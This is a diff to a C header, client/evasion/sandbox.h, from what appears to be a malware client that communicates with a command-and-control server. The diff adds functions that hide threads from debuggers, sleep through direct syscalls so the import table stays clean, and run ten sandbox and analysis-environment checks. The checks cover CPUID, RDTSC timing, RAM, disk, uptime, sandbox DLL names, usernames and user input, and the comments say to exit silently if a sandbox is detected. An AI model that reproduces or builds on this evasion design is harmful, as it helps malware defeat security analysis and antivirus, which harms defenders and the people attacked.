@@ -1,49 +1,39 @@
 /*
  * client/evasion/sandbox.h  –  Sandbox / analysis environment detection
  * =======================================================================
- * Provides a single function:
+ * Provides three functions:
+ *
+ *   sandbox_harden()
+ *       Call once per thread at the very start of WinMain and _agent_thread.
+ *       Hides the calling thread from any attached debugger via
+ *       NtSetInformationThread(ThreadHideFromDebugger).  No-op on systems
+ *       with no debugger attached.
  *
  *   sandbox_check()
  *       Returns TRUE  if the process appears to be running inside an
  *       automated analysis environment (sandbox, AV emulator, debugger).
  *       Returns FALSE if the environment looks like a real user system.
  *
- * Call this at startup before any C2 activity.  If it returns TRUE, the
- * caller should exit silently (not return an error — clean exits leave no
- * forensic traces in sandbox reports).
+ *   sandbox_delay()
+ *       Sleep 15 s + uniform jitter [0, 10 s] via NtDelayExecution direct
+ *       syscall so no Win32 Sleep() import appears in the IAT.
  *
- * Checks performed (all user-mode, no driver required):
+ * Call order: sandbox_harden() → sandbox_check() → [exit if TRUE]
+ *             → sandbox_delay() → connect loop.
  *
- *   1. CPUID hypervisor bit  — set by VMware, VirtualBox, Hyper-V, KVM.
- *      Most sandboxes run inside a VM.  Bare-metal targets are unaffected.
- *      Real svchost.exe processes do run inside Hyper-V on Windows 11, so
- *      this check is combined with others rather than used alone.
+ * Checks performed by sandbox_check() (all user-mode, no driver required):
  *
- *   2. RDTSC timing anomaly  — hypervisors add overhead to RDTSC.  Two
- *      RDTSC reads separated by a CPUID serialisation instruction should
- *      differ by < 500 cycles on bare metal; sandboxes typically show
- *      thousands of cycles.  Threshold: 1 000 000 cycles.
- *
- *   3. Physical RAM < 4 GB  — sandbox VMs routinely get 1-2 GB.
- *      Most real workstations have >= 4 GB since ~2012.
- *      Read from PEB->OSPlatformId? No — use GlobalMemoryStatusEx.
- *
- *   4. Number of logical processors < 2  — single-CPU analysis VMs are
- *      common; modern workstations have >= 2 logical cores.
- *
- *   5. Known sandbox process names  — Cuckoo/ANY.RUN/VMRay inject
- *      agent processes with recognisable names.  Walk the LDR list for
- *      known module names before checking the process list.
- *      Checked via PEB walk (no CreateToolhelp32Snapshot / OpenProcess).
- *
- *   6. Execution delay  — sleep 15 + jitter(10) seconds via NtDelayExecution
- *      direct syscall before any network activity.  Most automated sandboxes
- *      have a 30-120 second budget; a 15-25 second sleep consumes a large
- *      fraction without triggering the "immediate sleep" heuristic that some
- *      sandboxes detect.
- *
- * None of these checks is individually reliable; their combination gives
- * a low false-positive rate on real enterprise workstations.
+ *   1. CPUID hypervisor bit  — combined with RDTSC anomaly or single CPU.
+ *   2. RDTSC timing anomaly  — threshold 50 000 cycles (with check 1).
+ *   3. Physical RAM < 2 GB.
+ *   4. Single logical CPU    — combined with check 1.
+ *   5. Known sandbox DLL names in PEB LDR  (21 entries).
+ *   6. Suspicious username / computer name (14 users, 15 hosts).
+ *   7. System drive < 60 GB.
+ *   8. Machine uptime < 3 minutes.
+ *   9. Debugger attached     — IsDebuggerPresent + NtGlobalFlag heap bits
+ *                              + NtQueryInformationProcess(ProcessDebugPort).
+ *  10. No user input > 60 s  — GetLastInputInfo via PEB walk into user32.
  */
 
 #pragma once
@@ -60,10 +50,19 @@ extern "C" {
 #endif
 
 /*
+ * sandbox_harden()
+ * ----------------
+ * Hide the calling thread from any attached debugger.
+ * Call once at the top of WinMain and once at the top of _agent_thread.
+ * No-op when no debugger is attached.
+ */
+void sandbox_harden(void);
+
+/*
  * sandbox_check()
  * ---------------
- * Run all detection heuristics.  Returns TRUE if any trigger fires
- * (abort execution).  Returns FALSE on a clean system.
+ * Run all 10 detection heuristics.  Returns TRUE if any trigger fires
+ * (caller should exit silently).  Returns FALSE on a clean system.
  */
 BOOL sandbox_check(void);
 
